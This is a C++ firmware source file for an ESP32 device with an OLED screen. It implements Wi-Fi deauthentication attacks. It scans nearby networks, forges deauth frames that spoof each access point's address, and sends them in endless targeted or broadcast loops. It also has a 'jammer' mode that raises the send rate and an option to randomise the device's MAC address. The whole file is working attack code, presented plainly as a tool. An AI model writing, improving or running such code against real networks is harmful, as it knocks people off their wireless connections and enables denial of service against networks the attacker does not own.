#include "cstdio"
#include "cstring"
#include "esp_wifi.h"
#include "stdint.h"

#include "tool_state.h"
#include "display_common.h"
#include "console_common.h"
#include "wifi_common.h"
#include "wifi_deauth.h"

uint8_t phase = 0;
uint32_t sent_count = 0;
uint8_t target_bssid[6];
uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);
int start_target_index = 0;
uint8_t repeats_per_target = 1;
uint16_t send_delay = 100;

bool _send_deauth_frame_to_ap(uint8_t target_addr[])
{
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);

    // Source address (the AP we're impersonating)
    memcpy(&packet[10], target_addr, 6);

    // BSSID (also the AP address)
    memcpy(&packet[16], target_addr, 6);

    // Send the frame
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    return true;
}

bool _broadcast_send_deauth_frame()
{
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);

    // Source address (the AP we're impersonating)
    memcpy(&packet[10], broadcastAddress, 6);

    // BSSID (also the AP address)
    memcpy(&packet[16], broadcastAddress, 6);

    // Send the frame
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    return true;
}

static void _show_deauth_progress_frame(const char *text, uint32_t sent_count, uint8_t phase)
{
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    draw_centered_text(text, 10, 1, false, false);

    const int bar_x = 14;
    const int bar_y = 32;
    const int bar_w = 100;
    const int bar_h = 10;

    display.drawRect(bar_x, bar_y, bar_w, bar_h, SSD1306_WHITE);
    int fill_width = ((phase + 1) * (bar_w - 2)) / 3;
    display.fillRect(bar_x + 1, bar_y + 1, fill_width, bar_h - 2, SSD1306_WHITE);

    char count_text[24];
    snprintf(count_text, sizeof(count_text), "%lu sent", static_cast<unsigned long>(sent_count));
    draw_centered_text(count_text, 48, 1, false, false);

    for (uint8_t i = 0; i < 3; i++)
    {
        int x = 52 + (i * 12);
        if (((phase + i) % 3) == 0)
        {
            display.fillCircle(x, 58, 2, SSD1306_WHITE);
        }
        else
        {
            display.drawCircle(x, 58, 2, SSD1306_WHITE);
        }
    }

    display.display();
}

// Attacks functions utility
// Configure attacks flags
void _configure_attack_flags(bool random_mac, bool safe_mode, bool jammer_mode){
    if (random_mac)
    {
        set_random_mac();
    }

    if (jammer_mode)
    {
        // Resetting deafult flags
        safe_mode = false;

        send_delay = 10;
        repeats_per_target += 5;
    }

    if (safe_mode && repeats_per_target > 1)
    {
        send_delay = 75;
        repeats_per_target = 1;
    }
}

// launch targeted de-auth
void _launch_targeted_deauth()
{
    int selected_target = select_target_network();
    
    if (selected_target < 0)
    {
        show_task_progress_frame("Target select canceled", 100, phase, false);
        delay(350);
        disable_wifi();
        return;
    }

    start_target_index = selected_target;
    target_count = 1;

    while (true)
    {
        if (is_menu_pressed || is_home_pressed || is_select_pressed || is_movefd_pressed || is_movebd_pressed)
        {
            break;
        }

        for (int idx = start_target_index; idx < (start_target_index + target_count); idx++)
        {
            if (!parse_bssid(networks[idx].bssid, target_bssid))
            {
                continue;
            }

            if (networks[idx].channel > 0)
            {
                esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
                delay(1); // Let radio settle on new channel
            }

            for (uint8_t rep = 0; rep < repeats_per_target; rep++)
            {
                if (_send_deauth_frame_to_ap(target_bssid))
                {
                    sent_count++;
                }
            }

            phase = (phase + 1) % 3;
            _show_deauth_progress_frame("Sending DE-AUTH Frames", sent_count, phase);
            delay(send_delay);
        }
    }
}

// launch broadcast de-auth
void _launch_broadcast_deauth()
{
    while (true)
    {
        if (is_menu_pressed || is_home_pressed || is_select_pressed || is_movefd_pressed || is_movebd_pressed)
        {
            break;
        }

        for (int idx = start_target_index; idx < scanned_network_count; idx++)
        {
            if (!parse_bssid(networks[idx].bssid, target_bssid))
            {
                continue;
            }

            if (networks[idx].channel > 0)
            {
                esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
                delay(1);
            }

            for (uint8_t rep = 0; rep < repeats_per_target; rep++)
            {
                if (_send_deauth_frame_to_ap(target_bssid))
                {
                    sent_count++;
                }
            }

            phase = (phase + 1) % 3;
            _show_deauth_progress_frame("Broadcasting DE-AUTH frames ", sent_count, phase);
            delay(send_delay);
        }
    }
}

void launch_deauth_handler(const char *attack_type, bool random_mac, bool safe_mode, bool jammer_mode)
{

    _configure_attack_flags(random_mac, safe_mode, jammer_mode);

    init_wifi();
    scan_wifi("Scanning targets", safe_mode);

    if (scanned_network_count <= 0)
    {
        show_task_progress_frame("No target AP found", 100, 0, false);
        delay(450);
        disable_wifi();
        return;
    }

    esp_wifi_set_promiscuous(true);

    if (strcmp(attack_type, "targeted_deauth") == 0)
    {
        _launch_targeted_deauth();

        show_task_progress_frame("Targeted DE-AUTH stopped", 100, phase, false);
    }
    else if (strcmp(attack_type, "broadcast_deauth") == 0)
    {
        _launch_broadcast_deauth();

        show_task_progress_frame("Broadcast DE-AUTH stopped", 100, phase, false);
    }

    delay(250);

    clear_button_state();

    esp_wifi_set_promiscuous(false);

    disable_wifi();
}